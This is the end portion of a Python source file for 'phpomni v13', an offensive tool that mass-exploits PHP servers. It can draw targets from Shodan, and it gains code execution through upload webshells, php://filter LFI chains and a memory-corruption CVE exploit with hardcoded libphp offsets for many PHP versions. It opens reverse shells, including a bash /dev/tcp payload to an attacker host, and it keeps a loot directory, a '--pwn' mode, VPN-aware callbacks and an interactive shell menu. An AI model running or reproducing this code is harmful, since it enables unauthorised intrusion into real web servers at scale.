            ok(f"using mullvad forwarded port {fwd}")
        elif vpn:
            warn("no forwarded port - will fall back to HTTP if reverse fails")

    say("")
    say(_c("  ready", "36"))
    say(f"    targets   {len(targets)}  ({targets[0]})")
    say(f"    shell     {args.transport}")
    say(f"    loudness  {loud}")
    if args.lhost:
        say(f"    call back {args.lhost}:{args.lport}")
    if not menu("go?", [("yes, run it", True), ("quit", False)], 1):
        return None
    args.urls = targets
    return args


def self_test() -> int:
    fails = 0

    def chk(name: str, cond: bool) -> None:
        nonlocal fails
        if not cond:
            fails += 1
            print(f"FAIL {name}")

    st, h, b = split_headers(b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc")
    chk("crlf", st == 200 and h.get("content-length") == "3" and b == b"abc")
    st, h, b = split_headers(b"HTTP/1.1 302 Found\nLocation: /x\n\nyo")
    chk("lf", st == 302 and h.get("location") == "/x" and b == b"yo")
    chk("no status", split_headers(b"garbage")[0] == 0)

    forms = parse_upload_forms("http://h/", b"<form action='/up.php'><input type=hidden name=csrf "
                                             b"value=t><input type=file name=doc></form>")
    chk("form bare", len(forms) == 1 and forms[0]["field"] == "doc" and forms[0]["path"] == "/up.php")
    chk("form extra", bool(forms) and forms[0]["extra"].get("csrf") == "t")
    forms = parse_upload_forms("http://h/x/", b'<form action="a.php" method="post">'
                                              b'<input type="file" name="img"></form>')
    chk("form quoted", len(forms) == 1 and forms[0]["path"] == "/x/a.php")
    chk("no file field",
        parse_upload_forms("http://h/", b'<form><input type="hidden" name="a"></form>') == [])

    mp = build_multipart([("f", "a.php", b"x", "image/gif")], b"B")
    chk("multipart", b'filename="a.php"' in mp and mp.endswith(b"--B--\r\n"))
    mp = build_multipart([("a", "b")], b"B")
    chk("multipart text", b'name="a"' in mp and b"filename=" not in mp and b"\r\n\r\nb\r\n" in mp)
    mp = build_multipart([("a", b"bytes")], b"B")
    chk("multipart bytes", b"\r\n\r\nbytes\r\n" in mp)

    chk("chain", build_chain("<?php echo 1;?>").startswith("php://filter/"))
    chk("chain chars", set(base64.b64encode(b"<?php echo 1;?>").decode()) <= set(_PFX))
    chk("names", any(n.endswith(".pht") for n, _ in _upload_names()))
    chk("returned", _returned_paths('{"url":"/up/a.php"}', "a.php") == ["/up/a.php"])
    chk("returned rel", _returned_paths('href="./a.php"', "a.php") == ["/a.php"])
    chk("proof", proof_body(f"{LFI_MARKER}out{LFI_END}tail", LFI_MARKER, LFI_END) == "out")
    chk("proof missing", proof_body("nope", LFI_MARKER, LFI_END) == "")

    chk("url_ok", all(url_ok(x) for x in (
        "example.com/x", "https://1.2.3.4:8080/", "localhost:8080", "sub.domain.co.uk",
        "[::1]:8080")))
    chk("url bad", not any(url_ok(x) for x in ("nope", "", "http://", "a b", "-")))
    chk("norm", norm_url("example.com") == "http://example.com")
    chk("norm keeps", norm_url("https://a.b") == "https://a.b")
    chk("menu clamp", menu.__defaults__ == (1,))
    chk("progress", len(_progress_variants("PAY")) == 2)
    chk("session_paths", all(p.endswith("/") for p in session_paths(Target("http://h/"))))

    ns = argparse.Namespace(no_upload=False, no_lfi=False, config_upload=False, no_cve=False)
    chk("plan has upload", "upload" in plan_for(Target("http://h/"), ns))
    chk("plan no cve", "cve" not in plan_for(Target("http://h/"), ns))
    chk("plan no upload", "upload" not in plan_for(
        Target("http://h/"), argparse.Namespace(no_upload=True, no_lfi=False,
                                                config_upload=False, no_cve=False)))

    chk("cve vuln", cve_state("8.4.26") == "vuln")
    chk("cve fixed", cve_state("8.4.27") == "fixed" and cve_state("8.5.12") == "fixed")
    chk("cve eol", cve_state("8.1.33") == "eol")
    chk("cve unknown", cve_state("") == "unknown" and cve_state("nonsense") == "unknown")
    chk("ini bytes", _ini_bytes("8M") == 8 << 20 and _ini_bytes("1G") == 1 << 30)
    chk("ini bad", _ini_bytes("") == 0 and _ini_bytes("nope") == 0)

    lay = Layout()
    chk("layout short cap", Layout(long=False).max_cmd == 14)
    chk("layout long grows", lay.size_for("x" * 500) > 500)
    chk("layout offs", Layout.load("", "amd64", "2f8,5c0").system_off == 0x2F8)
    chk("layout bad offs", Layout.load("", "amd64", "zz") is None)
    chk("layout profile", Layout.load("8.4.26", "amd64", "").strval == 0x5C0)
    chk("layout profile zif", Layout.load("8.4.26", "amd64", "").system_off == 0x465370)
    chk("layout profile dtor", Layout.load("8.4.26", "amd64", "").dtor == 0x65EB60)
    chk("layout miss", Layout.load("9.9.9", "amd64", "") is None)
    p8511 = Layout.load("8.5.11", "amd64", "")
    chk("layout 8.5.11", p8511 is not None and p8511.system_off == 0x5996E0
        and p8511.dtor == 0x7B47A0 and p8511.forge_len == 63)
    p25a = Layout.load("8.4.25", "arm64", "")
    chk("layout arm64", p25a is not None and p25a.system_off == 0x42FA30
        and p25a.forge_len == 63)
    chk("layout forge 79", Layout.load("8.4.26", "amd64", "").forge_len == 79)
    chk("matrix size", len(BUILTIN_PROFILES) == 29)
    tcfg = Target("http://h/")
    rcfg = Response(200, {}, b"PHP Fatal error:  Allowed memory size of 134217728"
                              b" bytes exhausted (tried to allocate 8388624 bytes)")
    chk("learn oom", _learn_config(tcfg, rcfg) == "oom"
        and tcfg.profile.memory_limit == "134217728"
        and _ini_bytes(tcfg.profile.memory_limit) == (128 << 20))
    rcfg = Response(200, {}, b"PHP Warning:  POST Content-Length of 10485770 bytes"
                              b" exceeds the limit of 8388608 bytes in Unknown on line 0")
    chk("learn post", _learn_config(tcfg, rcfg) == "warn"
        and tcfg.profile.post_max_size == "8388608")
    chk("learn quiet", _learn_config(tcfg, Response(200, {}, b"ok")) == "")
    chk("sz fmt", _sz(8 << 20) == "8M" and _sz(1024) == "1024")

    # Both fake bases carry a 0x20 byte: php_url_encode turns it into '+',
    # so these checks prove the '+' -> %20 fold in _cookie_leak (a real 0x2B
    # byte arrives as %2B and must survive untouched).
    chunk = 0x7F5520400000
    leak = bytearray(4096)
    for i in range(0, 4096 - 8, 16):
        leak[i:i + 8] = chunk.to_bytes(8, "little")
    chk("chunk base", _chunk_base(bytes(leak)) == chunk)
    leak2 = bytearray(4096)
    for i in range(0, 64, 16):
        leak2[i:i + 8] = chunk.to_bytes(8, "little")
    chk("chunk base few", _chunk_base(bytes(leak2)) == 0)
    libphp = 0x7F1220340000
    leak3 = bytearray(4096)
    leak3[8:16] = (libphp + 0x65EB60).to_bytes(8, "little")
    chk("lib base", _libphp_base(bytes(leak3), 0x65EB60) == libphp)
    leak3[8:16] = (libphp + 0x65EB61).to_bytes(8, "little")
    chk("lib base bad", _libphp_base(bytes(leak3), 0x65EB60) == 0)
    hdr = "PHPSESSID=" + urllib.parse.quote_from_bytes(
        bytes(leak3), safe="").replace("%20", "+") + "; path=/"
    chk("cookie leak", _cookie_leak(Response(200, {"set-cookie": hdr}, b""))[8:16]
        == (libphp + 0x65EB61).to_bytes(8, "little"))
    leak4 = bytearray(4096)
    leak4[8:16] = (libphp + 0x65EB61).to_bytes(8, "little")
    for i in range(16, 4096 - 8, 16):
        leak4[i:i + 8] = chunk.to_bytes(8, "little")
    hdr4 = "PHPSESSID=" + urllib.parse.quote_from_bytes(
        bytes(leak4), safe="").replace("%20", "+") + "; path=/"
    dec = _cookie_leak(Response(200, {"set-cookie": hdr4}, b""))
    chk("cookie plus", dec[8:16] == (libphp + 0x65EB61).to_bytes(8, "little")
        and _chunk_base(dec) == chunk)
    chk("cookie none", _cookie_leak(Response(200, {}, b"")) == b"")

    t = Target("http://h/")
    # Profile defaults to session_progress=True (PHP factory default, and the
    # v13 php2shell-first strategy needs the prong to fire on targets whose
    # phpinfo is unreadable). The gate-off case must therefore be constructed
    # explicitly instead of relying on a fresh Target.
    t.profile.session_progress = False
    chk("gate off", cve_gate(t) == ("", "session.upload_progress off"))
    t.profile.session_progress = True
    t.profile.sapi = "apache"
    chk("gate mod_php", cve_gate(t)[0] == "109618")
    t.profile.display_errors = False
    chk("gate no display", cve_gate(t)[0] == "")
    t.profile.display_errors = True
    t.profile.sapi = "fpm"
    t.profile.fastcgi_buffering = True
    chk("gate buffered", cve_gate(t)[0] == "")
    t.profile.fastcgi_buffering = False
    chk("gate fpm", cve_gate(t)[0] == "109619")
    t.profile.sapi = "nginx"
    chk("gate nginx", cve_gate(t)[0] == "109619")

    forge = _cve_forge(Target("http://h/"), Layout(system_off=0x2F8), 0x5555_0000_0000,
                       0x7F00_0000_0000, "id")
    chk("forge len", len(forge) >= 0xA7)
    chk("forge empty", _cve_forge(Target("http://h/"), Layout(), 0, 0x7F, "id") == b"")
    chk("forge sys", (0x7F00_0000_02F8).to_bytes(8, "little") in forge)

    chk("proof strict", CVE_PROOF_RE.search("uid=33(www-data) gid=33") is not None)
    chk("proof strict page", CVE_PROOF_RE.search("Apache/2.4.69 (Debian) Server at h Port 80") is None)
    tl = Target("http://h/", lhost="10.0.0.5", lport=4444)
    pl = cve_payload(tl)
    chk("cve payload sh", pl.startswith(b"echo PHPOMNI_")
        and b"bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" in pl)
    chk("cve payload php", cve_payload(Target("http://h/")).startswith(b"<?php"))
    sp = shell_payload(tl)
    chk("rev payload php", sp.startswith(b'<?php $r="bash -c ')
        and b'";if(!@shell_exec($r))' in sp)
    print("self-test:", "ok" if not fails else f"{fails} failed")
    return 1 if fails else 0


def main() -> int:
    global COLOR, QUIET, LOOT
    ap = argparse.ArgumentParser(description="phpomni v13")
    ap.add_argument("urls", nargs="*")
    ap.add_argument("-f", "--file")
    ap.add_argument("--shodan")
    ap.add_argument("--shodan-key", default=os.environ.get("SHODAN_API_KEY", ""))
    ap.add_argument("--limit", type=int, default=50)
    ap.add_argument("--wizard", action="store_true", help="guided setup")
    ap.add_argument("--pwn", action="store_true", help="everything on, auto lhost/lport")
    ap.add_argument("--transport", default="auto", choices=["auto", "rev", "http"])
    ap.add_argument("--lhost", default="")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--no-listener", action="store_true")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("--no-discover", action="store_true")
    ap.add_argument("-H", "--header", action="append")
    ap.add_argument("--cookie", default="")
    ap.add_argument("--auth", default="")
    ap.add_argument("--proxy", default="")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--delay", default="0.05-0.25")
    ap.add_argument("--retries", type=int, default=1)
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--cmd", default="id; uname -a")
    ap.add_argument("--loot", default="loot")
    ap.add_argument("--config-upload", action="store_true")
    ap.add_argument("--restore-config", action="store_true")
    ap.add_argument("--no-upload", action="store_true")
    ap.add_argument("--no-lfi", action="store_true")
    ap.add_argument("--no-cve", action="store_true")
    ap.add_argument("--cve-only", action="store_true", help="php2shell only, no fallback")
    ap.add_argument("--cve-rounds", type=int, default=3)
    ap.add_argument("--cve-long", action=argparse.BooleanOptionalAction, default=True,
                    help="extend the carrier so commands are not capped at 14 bytes")
    ap.add_argument("--cve-offsets", default="", metavar="SYSTEM,STRING")
    ap.add_argument("--profiles", default="")
    ap.add_argument("--calibrate", default="", metavar="URL")
    ap.add_argument("--profiles-out", default="")
    ap.add_argument("--stage", action="store_true", help="write a payload file after RCE")
    ap.add_argument("--force-sapi", default="", choices=["", "apache", "fpm", "cgi", "nginx", "iis"])
    ap.add_argument("--force-os", default="", choices=["", "unix", "windows"])
    ap.add_argument("--chain-table", default="")
    ap.add_argument("--rce-only", action="store_true")
    ap.add_argument("--wrap", action="store_true")
    ap.add_argument("--plan", action="store_true")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--resume", default="")
    ap.add_argument("--strict-ssl", action="store_true")
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--plain", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    COLOR = sys.stdout.isatty() and not args.no_color and not os.environ.get("NO_COLOR")
    QUIET = args.quiet or (args.json and not sys.stdin.isatty())

    if args.self_test:
        return self_test()
    if args.wrap:
        print(build_chain("<?php echo 'PHPOMNI';system('id');?>"))
        return 0
    if args.chain_table:
        try:
            load_chain_table(args.chain_table)
        except (OSError, ValueError) as exc:
            bad(f"chain table: {exc}")
            return 2
    if args.profiles:
        try:
            load_profiles(args.profiles)
        except (OSError, ValueError) as exc:
            bad(f"profiles: {exc}")
            return 2

    if args.calibrate:
        return calibrate(norm_url(args.calibrate), args)

    if sys.stdin.isatty() and (args.wizard or
                               (not args.urls and not args.file and not args.shodan)):
        args = wizard(args) or args
        if not args.urls:
            return 0

    if args.pwn:
        args.config_upload = True
        args.stage = True
        args.lport = 0 if args.lport == 4444 else args.lport
        if args.transport == "auto" and (detect_mullvad() or mullvad_by_ip()):
            args.transport = "http"
        if not args.lhost and args.transport != "http":
            args.lhost = auto_lhost()

    targets = list(args.urls)
    if args.file:
        with open(args.file, encoding="utf-8") as fh:
            targets += [norm_url(x) for x in fh if x.strip() and not x.startswith("#")]
    if args.shodan:
        if not args.shodan_key:
            bad("shodan needs --shodan-key or SHODAN_API_KEY")
            return 2
        targets += shodan_targets(args.shodan, args.shodan_key, args.limit)
    if not targets:
        ap.print_help()
        return 2

    if args.resume and os.path.isfile(args.resume):
        with open(args.resume, encoding="utf-8") as fh:
            done = {ln.strip() for ln in fh}
        targets = [x for x in targets if x not in done]

    if not args.json and not args.no_banner:
        say(_c(BANNER, "36"))

    if args.loot:
        LOOT = args.loot
        try:
            os.makedirs(LOOT, exist_ok=True)
        except OSError:
            LOOT = ""

    words = load_words(args.wordlist)
    listener = None
    if args.transport != "http" and args.lhost and not args.no_listener:
        listener = ShellListener(args.lport)
        if listener.ok:
            args.lport = listener.port
            ok(f"listener on {listener.port} (call back to {args.lhost})")
        else:
            warn("listener bind failed, using HTTP shell")
            args.transport = "http"
    elif args.transport == "http":
        inf("HTTP shell mode - no listener needed")

    live = Live(dash_render(), refresh_per_second=4, console=CON) \
        if (RICH and not args.plain and not args.json and not args.quiet) else None
    if live:
        live.start()
        threading.Thread(target=lambda: [time.sleep(0.4) or live.update(dash_render())
                                         for _ in iter(int, 1)], daemon=True).start()

    results: list[Target] = []
    try:
        if len(targets) == 1:
            results.append(run_target(build_target(targets[0], args), args, words, listener))
        else:
            inf(f"{len(targets)} targets, {args.threads} threads")
            with ThreadPoolExecutor(max_workers=args.threads) as pool:
                futs = [pool.submit(run_target, build_target(u, args), args, words, listener)
                        for u in targets]
                for fu in as_completed(futs):
                    try:
                        results.append(fu.result())
                    except Exception:
                        if args.debug:
                            traceback.print_exc()
    except KeyboardInterrupt:
        say("\ninterrupted")
    finally:
        if live:
            live.stop()

    if args.quiet and not args.json:
        QUIET = False
    for t in results:
        report(t, args.json)
    if args.resume:
        with open(args.resume, "a", encoding="utf-8") as fh:
            fh.writelines(t.url("/") + "\n" for t in results)

    pwned = [t for t in results if t.shell_url]
    say("")
    if not pwned:
        warn(f"0/{len(results)} shells ({time.time() - START:.0f}s)")
        for t in results:
            say(f"  {t.host_header()}: {meaning(t)}")
    else:
        ok(f"{len(pwned)}/{len(results)} shells ({time.time() - START:.0f}s)")
        sender = None
        if listener and listener.shells:
            sender = listener
        elif args.transport == "auto":
            time.sleep(3)
            if listener and listener.shells:
                sender = listener
        if sender is None:
            inf("no callback received - using HTTP shell")
            sender = HttpShell(pwned[0], pwned[0].shell_url)
        if sys.stdin.isatty():
            shell_menu(sender, results)

    if listener:
        listener.stop()
    return 0 if pwned else 1


if __name__ == "__main__":
    sys.exit(main())
